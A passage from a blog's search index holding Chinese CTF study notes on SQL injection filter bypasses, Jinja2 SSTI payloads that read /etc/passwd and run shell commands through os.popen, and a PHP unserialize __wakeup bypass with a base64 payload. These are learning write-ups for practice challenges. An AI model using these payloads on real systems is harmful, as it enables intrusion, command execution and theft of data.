<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.用注释替换空格</span><br><span class="line">select/**/user,password/**/from /**/users;</span><br><span class="line">2.空格url编码%20</span><br><span class="line">3.两个空格代替一个空格</span><br><span class="line">4.用Tab代替空格</span><br><span class="line">5.%a0=空格</span><br><span class="line">6.如果空格被过滤，括号没有被过滤，可以用括号绕过</span><br><span class="line">select(user())from dual where(1=1)and(2=2)</span><br><span class="line">7.回车</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>引号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.使用十六进制</span><br><span class="line">例如：</span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">如引号被过滤，就可以尝试使用十六进制来进行绕过</span><br><span class="line">即可以将语句写为：</span><br><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br><span class="line"></span><br><span class="line">2.还有一个办法（前提是已经得知数据库名称和表名，例如dvwa和users）：</span><br><span class="line">select column_name from information_schema.columns where table_schema=database();</span><br><span class="line">查询所在数据库中的所有列名,然后</span><br><span class="line">可以猜或者尝试得知哪些字段在哪个表中，然后：</span><br><span class="line">select username,password from users;</span><br><span class="line"></span><br><span class="line">3.宽字节注入</span><br></pre></td></tr></table></figure>

<p><strong>逗号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit,这些子句方法都需要使用到逗号</span><br><span class="line"></span><br><span class="line">对于substr()和mid()这两个方法可以使用from的方式来解决：</span><br><span class="line">select substr(database() from 1 for 1);</span><br><span class="line"></span><br><span class="line">使用join</span><br><span class="line">union select 1,2 可以使用下面的句子代替</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br><span class="line"></span><br><span class="line">使用like</span><br><span class="line">select ascii(mid(user(),1,1))=80 可以使用下面的句子代替</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br><span class="line"></span><br><span class="line">limit中，使用offset绕过</span><br><span class="line">limit 1offset0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>or and xor not 绕过</strong>**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用符号替换and = &amp;&amp; or=|| xor=| not=!</span><br><span class="line">在敏感词中添加注释：an/**/d</span><br><span class="line">双写绕过oorr</span><br><span class="line">大小写变形</span><br><span class="line">编码</span><br></pre></td></tr></table></figure>

<p><strong>注释符绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3 or &#x27;1&#x27;=&#x27;1 即虽然无法使用注释符，但是可以闭合掉他</span><br><span class="line">或者：id=1&#x27; union select 1,2,&#x27;3</span><br><span class="line">最后添加or 1&#x27;</span><br><span class="line">最后添加 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>等号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用like</span><br><span class="line">使用!&lt;&gt;,因为&lt;&gt;是不等于</span><br><span class="line">regrep (正则表达匹配)</span><br></pre></td></tr></table></figure>

<p>&lt;&gt;<strong>被过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">greatest(),least()</span><br><span class="line">strcmp(str1,str2),第一个参数小于第二个参数，返回-1，否则为1</span><br><span class="line">in，between a and b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.csdn.net/weixin_44940180/article/details/107717511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&utm_relevant_index=1">(43条消息) SQL注入–绕过技巧_雪碧可乐_的博客-CSDN博客_sql注入绕过</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2021/12/14/ssti/</url>
    <content><![CDATA[<h1 id="SSTI-模板注入漏洞"><a href="#SSTI-模板注入漏洞" class="headerlink" title="SSTI 模板注入漏洞"></a>SSTI 模板注入漏洞</h1><p>文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。<br>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
<p>1.获取基类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用</span><br><span class="line">或者</span><br><span class="line">[].__class__.__bases__[0]       //其他的类似</span><br></pre></td></tr></table></figure>

<p>2.获取本类的子类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p>3.找到可利用的方法</p>
<p>&lt;type ‘file’&gt;等    &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>找到目标文件，接着读取文件</p>
<p>4.读写文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有四种方法，具体详情参考第二篇文章</p>
<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/cioi/p/12308518.html#a5">从零开始的ssti学习（已填） - Cxlover - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121569766">(40条消息) XCTF-攻防世界CTF平台-Web类——12、Web_python_template_injection（SSTI服务器模板注入、Flask框架之Jinja2模板渲染引擎）_Onlyone_1314的博客-CSDN博客</a></p>
<h1 id="Simple-SSTI-2-bugku"><a href="#Simple-SSTI-2-bugku" class="headerlink" title="Simple_SSTI_2  bugku"></a>Simple_SSTI_2  bugku</h1><p>第二次做这种题，感觉还是不会做，跟着wp做的</p>
<p>1.查看上一级所存在的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls ../&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>2.查看文件夹中有哪些文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls /app&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>3.查看文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>有些不理解，先当作常用命令记着吧！！</p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>unserialize</title>
    <url>/2021/12/26/unserialize/</url>
    <content><![CDATA[<h1 id="UNSERIALIZE"><a href="#UNSERIALIZE" class="headerlink" title="UNSERIALIZE"></a>UNSERIALIZE</h1><p>Web_php_unserialize  攻防世界</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeup函数 返回index.php所以必须绕过次函数</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flag所在文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;        		 <span class="comment">//判断是否传入参数</span></span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);  	<span class="comment">//对传入参数进行base64加密</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//正则检查</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>);      <span class="comment">//进行反序列化</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); 	<span class="comment">//返回想要结果</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.Demo  中file为变量，可以将fl4g.php作为变量传进去</p>
<p>2.function __wakeup() {<br>    if ($this-&gt;file != ‘index.php’)</p>
<p>强行要求输入的变量为index.php 考虑绕过</p>
<p>3.(preg_match(‘/[oc]:\d+:/i’</p>
<p>正则匹配，过滤掉以o/c:int   \d  是整数   /i区分大小写</p>
<p>在文中过滤掉的是序列化后得到的O:4  ,改为O:+4即可过滤</p>
<p>4.$var = base64_decode($_GET[‘var’]);</p>
<p>输入的结果要base64加密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeup函数 返回index.php所以必须绕过次函数</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flag所在文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=serialize(<span class="string">&#x27;$A&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line">var_dump(<span class="variable">$C</span>);</span><br><span class="line">var_dump(base64_decode(<span class="variable">$C</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p>
]]></content>
      <categories>
        <category>unserialize</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/01/16/%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
